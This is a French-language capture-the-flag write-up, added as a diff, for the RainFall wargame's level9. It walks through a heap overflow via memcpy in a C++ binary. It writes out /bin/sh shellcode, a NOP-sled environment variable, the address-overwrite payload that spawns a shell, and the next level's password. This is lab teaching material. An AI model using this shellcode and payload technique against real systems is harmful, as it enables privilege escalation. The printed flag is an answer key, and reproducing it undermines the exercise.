@@ -1,0 +1,123 @@
+Ce fichier a visiblement ses appels crypte, ainsi que plusieurs de ceux-ci qui sont en general utile pour exploiter la memoire. Nous allons voir ca tout de suite:
+
+level9@RainFall:~$ ltrace ./level9 1
+__libc_start_main(0x80485f4, 2, 0xbffff6a4, 0x8048770, 0x80487e0 <unfinished ...>
+_ZNSt8ios_base4InitC1Ev(0x8049bb4, 0xb7d79dc6, 0xb7eebff4, 0xb7d79e55, 0xb7f4a330) = 0xb7fce990
+__cxa_atexit(0x8048500, 0x8049bb4, 0x8049b78, 0xb7d79e55, 0xb7f4a330) = 0
+_Znwj(108, 0xbffff6a4, 0xbffff6b0, 0xb7d79e55, 0xb7fed280) = 0x804a008
+_Znwj(108, 5, 0xbffff6b0, 0xb7d79e55, 0xb7fed280)     = 0x804a078
+strlen("1")                                           = 1
+memcpy(0x0804a00c, "1", 1)                            = 0x0804a00c
+_ZNSt8ios_base4InitD1Ev(0x8049bb4, 11, 0x804a078, 0x8048738, 0x804a00c) = 0xb7fce4a0
++++ exited (status 11) +++
+
+On va essayer ici de faire un buffer overflow sur l'adresse destination de memcpy
+
+level9@RainFall:~$ ./level9 $(python -c 'print("\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "a" * 72 + "\x0c\xa0\x04\x08" * 4)')
+Segmentation fault (core dumped)
+
+level9@RainFall:~$ dmesg
+	...
+	[28179.589556] level9[5073]: segfault at 5099c031 ip 5099c031 sp bffff57c error 14
+
+On segfault sur l'opcode du debut de notre shellcode, on va donc essayer de sauter quelque part en memoire sur cet opdcode plutot que de l'interpreter comme $eip
+
+level9@RainFall:~$ export SHELLCODE=$(python -c 'print("\x90" * 200 + "\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80")')
+
+(gdb) x/32x *environ
+0xbffff7de:	0x4c454853	0x444f434c	0x90903d45	0x90909090
+0xbffff7ee:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffff7fe:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffff80e:	0x90909090	0x90909090	0x90909090	0x90909090
+	...
+
+Au passage, verifions que cela est possible avec un acces sur la heap probable au vu d'une utilisation de mmap ou malloc
+
+(gdb) maintenance info sections
+Exec file:
+    `/home/user/level9/level9', file type elf32-i386.
+    0x8048134->0x8048147 at 0x00000134: .interp ALLOC LOAD READONLY DATA HAS_CONTENTS
+    0x8048148->0x8048168 at 0x00000148: .note.ABI-tag ALLOC LOAD READONLY DATA HAS_CONTENTS
+    0x8048168->0x804818c at 0x00000168: .note.gnu.build-id ALLOC LOAD READONLY DATA HAS_CONTENTS
+    0x804818c->0x80481b8 at 0x0000018c: .gnu.hash ALLOC LOAD READONLY DATA HAS_CONTENTS
+    0x80481b8->0x8048288 at 0x000001b8: .dynsym ALLOC LOAD READONLY DATA HAS_CONTENTS
+    0x8048288->0x8048390 at 0x00000288: .dynstr ALLOC LOAD READONLY DATA HAS_CONTENTS
+    0x8048390->0x80483aa at 0x00000390: .gnu.version ALLOC LOAD READONLY DATA HAS_CONTENTS
+    0x80483ac->0x804840c at 0x000003ac: .gnu.version_r ALLOC LOAD READONLY DATA HAS_CONTENTS
+    0x804840c->0x804841c at 0x0000040c: .rel.dyn ALLOC LOAD READONLY DATA HAS_CONTENTS
+    0x804841c->0x8048464 at 0x0000041c: .rel.plt ALLOC LOAD READONLY DATA HAS_CONTENTS
+    0x8048464->0x8048492 at 0x00000464: .init ALLOC LOAD READONLY CODE HAS_CONTENTS
+    0x80484a0->0x8048540 at 0x000004a0: .plt ALLOC LOAD READONLY CODE HAS_CONTENTS
+    0x8048540->0x804881c at 0x00000540: .text ALLOC LOAD READONLY CODE HAS_CONTENTS
+    0x804881c->0x8048836 at 0x0000081c: .fini ALLOC LOAD READONLY CODE HAS_CONTENTS
+    0x8048838->0x804885c at 0x00000838: .rodata ALLOC LOAD READONLY DATA HAS_CONTENTS
+    0x804885c->0x80488c0 at 0x0000085c: .eh_frame_hdr ALLOC LOAD READONLY DATA HAS_CONTENTS
+    0x80488c0->0x8048a48 at 0x000008c0: .eh_frame ALLOC LOAD READONLY DATA HAS_CONTENTS
+    0x8049a48->0x8049a4c at 0x00000a48: .init_array ALLOC LOAD DATA HAS_CONTENTS
+    0x8049a4c->0x8049a54 at 0x00000a4c: .ctors ALLOC LOAD DATA HAS_CONTENTS
+    0x8049a54->0x8049a5c at 0x00000a54: .dtors ALLOC LOAD DATA HAS_CONTENTS
+    0x8049a5c->0x8049a60 at 0x00000a5c: .jcr ALLOC LOAD DATA HAS_CONTENTS
+    0x8049a60->0x8049b40 at 0x00000a60: .dynamic ALLOC LOAD DATA HAS_CONTENTS
+    0x8049b40->0x8049b44 at 0x00000b40: .got ALLOC LOAD DATA HAS_CONTENTS
+    0x8049b44->0x8049b74 at 0x00000b44: .got.plt ALLOC LOAD DATA HAS_CONTENTS
+    0x8049b74->0x8049b7c at 0x00000b74: .data ALLOC LOAD DATA HAS_CONTENTS
+    0x8049b80->0x8049bb8 at 0x00000b7c: .bss ALLOC
+    0x0000->0x002a at 0x00000b7c: .comment READONLY HAS_CONTENTS
+
+(gdb) info functions
+All defined functions:
+
+Non-debugging symbols:
+0x08048464  _init
+0x080484b0  __cxa_atexit
+0x080484b0  __cxa_atexit@plt
+0x080484c0  __gmon_start__
+0x080484c0  __gmon_start__@plt
+0x080484d0  std::ios_base::Init::Init()
+0x080484d0  _ZNSt8ios_base4InitC1Ev@plt
+0x080484e0  __libc_start_main
+0x080484e0  __libc_start_main@plt
+0x080484f0  _exit
+0x080484f0  _exit@plt
+0x08048500  _ZNSt8ios_base4InitD1Ev
+0x08048500  _ZNSt8ios_base4InitD1Ev@plt
+0x08048510  memcpy
+0x08048510  memcpy@plt
+0x08048520  strlen
+0x08048520  strlen@plt
+0x08048530  operator new(unsigned int)
+0x08048530  _Znwj@plt
+0x08048540  _start
+0x08048570  __do_global_dtors_aux
+0x080485d0  frame_dummy
+0x080485f4  main
+0x0804869a  __static_initialization_and_destruction_0(int, int)
+0x080486da  _GLOBAL__sub_I_main
+0x080486f6  N::N(int)
+0x080486f6  N::N(int)
+0x0804870e  N::setAnnotation(char*)
+0x0804873a  N::operator+(N&)
+0x0804874e  N::operator-(N&)
+0x08048770  __libc_csu_init
+0x080487e0  __libc_csu_fini
+0x080487e2  __i686.get_pc_thunk.bx
+0x080487f0  __do_global_ctors_aux
+0x0804881c  _fini
+0xb7fde7c0  __libc_memalign
+0xb7fde7c0  __libc_memalign@plt
+0xb7fde7d0  malloc
+0xb7fde7d0  malloc@plt
+0xb7fde7e0  calloc
+0xb7fde7e0  calloc@plt
+0xb7fde7f0  realloc
+0xb7fde7f0  realloc@plt
+0xb7fde800  ___tls_get_addr
+0xb7fde800  ___tls_get_addr@plt
+0xb7fde810  free
+0xb7fde810  free@plt
+
+level9@RainFall:~$ ./level9 $(python -c 'print("\x2e\xf8\xff\xbf" * 2 + "a" * 88 + "\x0c\xa0\x04\x08" * 4)')
+$ whoami
+bonus0
+$ cat /home/user/bonus0/.pass
+f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
